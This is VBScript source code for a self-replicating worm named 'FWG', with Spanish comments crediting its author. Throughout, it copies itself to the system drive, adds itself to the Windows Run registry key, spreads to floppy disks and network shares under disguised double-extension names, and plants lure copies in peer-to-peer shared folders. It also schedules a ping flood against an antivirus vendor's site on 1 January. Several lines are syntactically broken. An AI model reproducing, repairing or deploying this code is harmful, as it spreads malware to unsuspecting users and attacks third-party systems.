' El worm fue creado por Yo Lo Genere!!!
' El worm se llama: FWG
On Error Resume Next
set fso = createobject("scripting.filesystemobject")
Set s = CreateObject("Scripting.FileSystemObject")
Set v = CreateObject("Wscript.Shell")
set ws = createobject("scriting.filesystemobject")
s.copyfile wscript.scriptfullname, "c:\.vbs"
s.copyfile wscript.scriptfullname, "c:\je.vbs"
set ws = createobject("wscript.shell")
ws.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\", "c:\.vbs"
s.copyfile "wscript.scriptfullname", "a:\Important.txt.vbs"
s.copyfile "wscript.scriptfullname", "a:\Juegos.zip.vbs"
s.copyfile "wscript.scriptfullname", "a:\ReadMe.txt.vbs"
s.copyfile "wscript.scriptfullname", "a:\foto.jpg.vbs"
s.copyfile "wscript.scriptfullname", "a:\Galeria de Fotos.vbs"
s.copyfile "wscript.scriptfullname", "a:\ventas.doc.vbs"
Set wsn = CreateObject("Wscript.NetWork")
Set enm = wsn.EnumNetworkDrives
For net = 0 To enm.Count - 1
If InStr(enm.Item(net), "\\") = 1 Then
fso.CopyFile file1, enm.Item(net) & "\setup.vbs
Set creads = fso.CreateTextFile(enm.Item(net), "\Autoexec.bat")
creads.writeline "Start C:\.vbs"
creads.Close
End If
Next
ws.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Loader", "c:\virii.vbs"

set man = fso.createtextfile("c:\xDDD.cmd", true)
man.writeline "ping -l 65000 -w (int(rnd * 2)) -t http://www.avp.ch"
man.close
if day(now()) = 1And if month(now()) = 1Then
v.start("xDDD.cmd")
files = Array("AnalPasswords.zip", "ICQ LITE", "ICQ Pro  2003.exe", "Shakira-Naked.jpg ", "Galilea Montijo Sex.jpg", "Serial Visual basic.txt", "Delphi 7 Trial Crack", "Shakira-Suerte.mp3", "Grokster""Msn Hack")
DirKaz = Dir1 & "\KaZaA\My Shared Folder\"
If fso.FolderExists(DirKaz) = True Then 
For cop = 0 To 9
fso.CopyFile file1, DirKaz & files(cop) & ".vbs"
Next
end if
files = Array("AnalPasswords.zip", "ICQ LITE", "ICQ Pro  2003.exe", "Shakira-Naked.jpg ", "Galilea Montijo Sex.jpg", "Serial Visual basic.txt", "Delphi 7 Trial Crack", "Shakira-Suerte.mp3", "Grokster""Msn Hack")
Dirbear = Dir1 & "\bearshare\shared\"
If fso.FolderExists(Dirbear) = True Then 
For cop = 0 To 9
fso.CopyFile file1, Dirbear & files(cop) & ".vbs"
Next
end if
files = Array("AnalPasswords.zip", "ICQ LITE", "ICQ Pro  2003.exe", "Shakira-Naked.jpg ", "Galilea Montijo Sex.jpg", "Serial Visual basic.txt", "Delphi 7 Trial Crack", "Shakira-Suerte.mp3", "Grokster""Msn Hack")
Dirmorph = Dir1 & "\Morpheus\My Shared Folder\"
If fso.FolderExists(Dirmorph) = True Then 
For cop = 0 To 9
fso.CopyFile file1, Dirmorph & files(cop) & ".vbs"
Next
end if
files = Array("AnalPasswords.zip", "ICQ LITE", "ICQ Pro  2003.exe", "Shakira-Naked.jpg ", "Galilea Montijo Sex.jpg", "Serial Visual basic.txt", "Delphi 7 Trial Crack", "Shakira-Suerte.mp3", "Grokster""Msn Hack")
DirIcq = Dir1 & "\ICQ\shared files\"
If fso.FolderExists(DirIcq) = True Then 
For cop = 0 To 9
fso.CopyFile file1, DirIcq & files(cop) & ".vbs"
Next
end if

